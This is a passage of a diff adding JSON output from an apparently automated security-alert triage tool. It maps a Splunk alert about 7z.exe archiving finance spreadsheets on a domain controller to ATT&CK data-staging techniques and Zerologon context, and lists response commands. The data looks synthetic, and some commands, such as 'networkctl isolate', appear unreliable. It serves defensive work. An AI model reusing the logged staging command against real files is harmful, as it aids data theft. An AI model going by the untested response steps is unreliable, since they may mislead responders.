+        "tfidf_score": 0.833,
+        "embedding_score": 0.9911,
+        "rule_score": 0.0,
+        "field_match_score": 0.0,
+        "final_score": 0.4481,
+        "confidence": 93.76,
+        "explanation": []
+      },
+      {
+        "technique_id": "T1560.001",
+        "name": "Archive via Utility",
+        "tactics": [
+          "collection"
+        ],
+        "tfidf_score": 0.5304,
+        "embedding_score": 0.986,
+        "rule_score": 0.0,
+        "field_match_score": 0.0,
+        "final_score": 0.3563,
+        "confidence": 74.56,
+        "explanation": []
+      },
+      {
+        "technique_id": "T1074",
+        "name": "Data Staged",
+        "tactics": [
+          "collection"
+        ],
+        "tfidf_score": 0.7314,
+        "embedding_score": 0.6464,
+        "rule_score": 0.0,
+        "field_match_score": 0.0,
+        "final_score": 0.3487,
+        "confidence": 72.97,
+        "explanation": []
+      }
+    ],
+    "recommended_actions": [
+      "Collect additional telemetry and validate whether the activity is benign or malicious"
+    ],
+    "soar": {
+      "incident_type": "collection",
+      "urgency": "medium",
+      "recommended_actions": [
+        "grep '10.0.0.10\\|corp\\jdoe\\|7z.exe' output/mapped_alerts.json",
+        "tcpdump -i any host 10.0.0.26 or host 10.0.0.10",
+        "networkctl isolate 10.0.0.10"
+      ],
+      "playbook": "collection_response"
+    },
+    "ai_analysis": {
+      "why_it_matters": "This alert indicates potentially suspicious behavior that should be investigated.",
+      "risk_summary": "Technique: Archive Collected Data | Tactics: collection | Confidence: 100.0%",
+      "recommended_next_steps": [
+        "grep '10.0.0.10\\|corp\\jdoe\\|7z.exe' output/mapped_alerts.json",
+        "tcpdump -i any host 10.0.0.26 or host 10.0.0.10",
+        "networkctl isolate 10.0.0.10"
+      ],
+      "context": "User: corp\\jdoe | Source IP: 10.0.0.26 | Destination IP: 10.0.0.10"
+    },
+    "agent_decision": {
+      "agent_state": "completed_assessment",
+      "top_technique": {
+        "technique_id": "T1560",
+        "technique_name": "Archive Collected Data",
+        "confidence": 100.0,
+        "tactics": [
+          "collection"
+        ]
+      },
+      "decisions": [
+        "high_confidence_detection",
+        "possible_staging",
+        "user_activity_correlation_found",
+        "destination_ip_correlation_found",
+        "critical_asset_at_risk",
+        "high_value_asset_targeted"
+      ],
+      "enrichment_steps": [
+        "review archive creation and outbound transfer attempts"
+      ],
+      "enrichment_results": {
+        "related_by_source_ip": [],
+        "related_by_destination_ip": [
+          "splunk-1"
+        ],
+        "related_by_username": [
+          "splunk-2",
+          "splunk-3",
+          "splunk-8",
+          "splunk-9"
+        ]
+      },
+      "ioc_enrichment": {
+        "source_ip": "10.0.0.26",
+        "destination_ip": "10.0.0.10",
+        "source_ip_class": "internal",
+        "destination_ip_class": "internal",
+        "ioc_findings": []
+      },
+      "recommended_next_steps": [
+        "grep '10.0.0.10\\|corp\\jdoe\\|7z.exe' output/mapped_alerts.json",
+        "tcpdump -i any host 10.0.0.26 or host 10.0.0.10",
+        "networkctl isolate 10.0.0.10",
+        "prioritize_patch_and_isolation"
+      ],
+      "vulnerability_context": {
+        "asset": "10.0.0.10",
+        "top_cve": "CVE-2020-1472",
+        "title": "Zerologon",
+        "risk_score": 16.0,
+        "priority": "critical"
+      },
+      "final_disposition": {
+        "incident_type": "collection",
+        "urgency": "medium",
+        "confidence": 100.0
+      }
+    },
+    "asset_context": {
+      "name": "DC01",
+      "criticality": 10
+    },
+    "investigation_state": {
+      "alert_id": "splunk-10",
+      "alert": {
+        "alert_id": "splunk-10",
+        "event_type": "archive_activity",
+        "log_source": "splunk",
+        "source_ip": "10.0.0.26",
+        "destination_ip": "10.0.0.10",
+        "username": "corp\\jdoe",
+        "process_name": "7z.exe",
+        "command_line": "7z.exe a finance_backup.7z C:\\Finance\\*.xlsx",
+        "details": "Archive creation of sensitive files prior to transfer | Splunk detection: Archive Collected Data",
+        "severity": "high",
+        "raw_time": "2026-04-05T19:55:00Z"
+      },
+      "severity": "medium",
+      "triage_score": 30,
+      "confidence": 1.0,
+      "top_technique": {
+        "technique_id": "T1560",
+        "technique_name": "Archive Collected Data"
+      },
+      "incident_type": "collection",
+      "playbook": "collection_response",
+      "evidence": [],
+      "decisions": [
+        "response_recommended"
+      ],
+      "actions_taken": [
+        "recommend_response"
+      ],
+      "recommended_next_steps": [
+        "grep '10.0.0.10\\|corp\\jdoe\\|7z.exe' output/mapped_alerts.json",
+        "tcpdump -i any host 10.0.0.26 or host 10.0.0.10",
+        "networkctl isolate 10.0.0.10",
+        "prioritize_patch_and_isolation"
+      ],
+      "investigation_log": [
+        {
+          "step": "recommend_response",
+          "before_confidence": 1.0,
+          "after_confidence": 1.0,
+          "result": [
+            "grep '10.0.0.10\\|corp\\jdoe\\|7z.exe' output/mapped_alerts.json",
+            "tcpdump -i any host 10.0.0.26 or host 10.0.0.10",
+            "networkctl isolate 10.0.0.10",
+            "prioritize_patch_and_isolation"
+          ]
+        }
+      ],
+      "enrichments_run": [],
+      "stop_reason": "confidence_threshold_met"
+    }
+  }
+]
